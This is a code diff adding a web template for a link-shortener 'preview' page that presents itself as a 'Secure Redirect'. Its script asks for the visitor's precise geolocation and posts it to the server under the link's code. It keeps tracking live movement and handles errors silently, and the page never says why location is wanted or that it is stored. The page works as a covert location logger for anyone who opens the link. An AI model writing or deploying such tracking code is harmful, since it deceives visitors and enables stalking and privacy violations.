@@ -1,0 +1,249 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="preview-container">
+    <div class="glass-card preview-card">
+        <div class="preview-badge">Link Preview</div>
+        
+        <div class="preview-content">
+            {% if link.image and link.image != 'None' %}
+            <div class="preview-image">
+                <img src="{{ link.image }}" alt="{{ link.title or 'Preview image' }}" onerror="this.style.display='none'">
+            </div>
+            {% endif %}
+            
+            <div class="preview-info">
+                <h2 class="preview-title">{{ link.title or 'No title available' }}</h2>
+                {% if link.description and link.description != 'None' %}
+                <p class="preview-description">{{ link.description }}</p>
+                {% endif %}
+                <div class="preview-meta">
+                    <span class="meta-badge">Smart Link</span>
+                    <span class="meta-badge">Secure Redirect</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="preview-actions">
+            <button id="continueBtn" class="btn-primary btn-large">
+                <span>Continue to Website</span>
+                <span class="btn-icon">→</span>
+            </button>
+            <a href="/" class="btn-secondary">← Back to Home</a>
+        </div>
+    </div>
+</div>
+
+<style>
+    .spinner-small {
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255,255,255,0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 0.6s linear infinite;
+        display: inline-block;
+        margin-left: 8px;
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+</style>
+
+<script>
+    const continueBtn = document.getElementById('continueBtn');
+    const linkCode = "{{ link.code }}";
+    const originalUrl = "{{ link.original_url }}";
+    
+    let watchId = null;
+    let lastLocation = null;
+    
+    async function sendLocationToBackend(latitude, longitude, isLive = true, accuracy = null) {
+        try {
+            const response = await fetch('/save_location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    link_code: linkCode,
+                    latitude: latitude,
+                    longitude: longitude,
+                    is_live: isLive,
+                    accuracy: accuracy
+                })
+            });
+            
+            if (response.ok) {
+                console.log('Location saved:', latitude, longitude);
+                return true;
+            } else {
+                console.error('Failed to save location:', await response.text());
+            }
+        } catch (error) {
+            console.error('Error saving location:', error);
+        }
+        return false;
+    }
+    
+    function handleLocationUpdate(position) {
+        const { latitude, longitude, accuracy } = position.coords;
+        
+        console.log(`Location update: ${latitude}, ${longitude} (accuracy: ${accuracy}m)`);
+        
+        // Check if moved more than 10 meters before sending update
+        if (lastLocation) {
+            const distance = getDistanceFromLatLonInMeters(
+                lastLocation.lat, lastLocation.lng,
+                latitude, longitude
+            );
+            
+            if (distance < 10) {
+                console.log('Movement less than 10m, skipping update');
+                return;
+            }
+        }
+        
+        lastLocation = { lat: latitude, lng: longitude };
+        sendLocationToBackend(latitude, longitude, true, accuracy);
+    }
+    
+    function handleLocationError(error) {
+        console.error('Location error:', error);
+        // Silently handle error - no user notification
+    }
+    
+    function startLiveTracking() {
+        if (!navigator.geolocation) {
+            console.log('Geolocation not supported');
+            return false;
+        }
+        
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+        
+        // First get initial position
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                console.log('Initial position captured:', latitude, longitude);
+                
+                // Send initial location
+                await sendLocationToBackend(latitude, longitude, true, accuracy);
+                
+                // Then start watching for changes
+                watchId = navigator.geolocation.watchPosition(
+                    handleLocationUpdate,
+                    handleLocationError,
+                    options
+                );
+            },
+            handleLocationError,
+            options
+        );
+        
+        return true;
+    }
+    
+    function stopLiveTracking() {
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+        }
+        console.log('Live tracking stopped');
+    }
+    
+    function getDistanceFromLatLonInMeters(lat1, lon1, lat2, lon2) {
+        const R = 6371e3; // Earth's radius in meters
+        const φ1 = lat1 * Math.PI/180;
+        const φ2 = lat2 * Math.PI/180;
+        const Δφ = (lat2-lat1) * Math.PI/180;
+        const Δλ = (lon2-lon1) * Math.PI/180;
+        
+        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+                  Math.cos(φ1) * Math.cos(φ2) *
+                  Math.sin(Δλ/2) * Math.sin(Δλ/2);
+        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        
+        return R * c;
+    }
+    
+    async function continueToWebsite() {
+        // Disable button to prevent multiple clicks
+        continueBtn.disabled = true;
+        continueBtn.innerHTML = '<span>Redirecting...</span><div class="spinner-small"></div>';
+        
+        // Check if geolocation is available
+        if (!navigator.geolocation) {
+            window.location.href = originalUrl;
+            return;
+        }
+        
+        try {
+            // Request permission and start tracking
+            const permission = await navigator.permissions.query({ name: 'geolocation' });
+            
+            if (permission.state === 'granted') {
+                // Permission already granted
+                startLiveTracking();
+                
+                // Wait 1 second for initial location to be captured
+                setTimeout(() => {
+                    window.location.href = originalUrl;
+                }, 1000);
+                
+            } else if (permission.state === 'prompt') {
+                // Need to ask for permission
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Permission granted, start tracking
+                        startLiveTracking();
+                        
+                        // Wait for initial location to be saved
+                        setTimeout(() => {
+                            window.location.href = originalUrl;
+                        }, 1000);
+                    },
+                    () => {
+                        // Permission denied - just redirect
+                        window.location.href = originalUrl;
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                // Permission denied previously - just redirect
+                window.location.href = originalUrl;
+            }
+        } catch (error) {
+            console.error('Permission query error:', error);
+            // Fallback: try to get location directly
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    startLiveTracking();
+                    setTimeout(() => {
+                        window.location.href = originalUrl;
+                    }, 1000);
+                },
+                () => {
+                    window.location.href = originalUrl;
+                }
+            );
+        }
+    }
+    
+    // Continue button click handler
+    continueBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        continueToWebsite();
+    });
+    
+    // Clean up on page unload
+    window.addEventListener('beforeunload', () => {
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+        }
+    });
+</script>
+{% endblock %}
